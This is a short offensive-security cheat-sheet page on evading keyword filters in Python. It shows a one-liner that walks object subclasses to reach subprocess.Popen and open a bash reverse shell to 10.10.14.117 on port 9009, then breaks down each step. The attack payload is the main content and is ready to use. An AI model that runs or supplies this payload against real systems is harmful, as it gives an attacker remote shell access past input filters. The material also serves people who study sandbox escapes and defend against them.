# Filter Evasion Techniques



## Filter Evasion for Python

### Subclass Enumeration Exploitation

If we can execute some python code, but this code has limitations for some key word, we can byssing this, using local library (subclasses) to create a revshell.

{% code title="Rev Shell in Python" overflow="wrap" %}
```python
().__class__.__base__.__subclasses__()[317](["/bin/bash", "-c", "ls|bash -i >& /dev/tcp/10.10.14.117/9009 0>&1"])
```
{% endcode %}

#### Breakdown of the code:

```python
().__class__.__base__.__subclasses__()
```

* `().__class__` : Retrieves the calss of an empty tuple `()`, which is `<class 'tuple'>`
* `.__base__`: Gets the base class of the `tuple`, which is `object`.
* `.__subclasses__()`: Lists all classes that inherit from `object` (all leaded classes in python)



```python
[317](["/bin/bash", "-c", "ls|bash -i >& /dev/tcp/10.10.14.117/9009 0>&1"])
```

* `[317]` : Accesses tge 318th subclass in the list, that is `subprocess.Popen` subclas, which it allow us to execute the follow command.
* `(["/bin/bash", "-c", "ls|bash -i >& /dev/tcp/10.10.14.117/9009 0>&1"])` : Call the previus class with this list as arguments. This command will create a Rev Shell to the IP and PORT indicated.



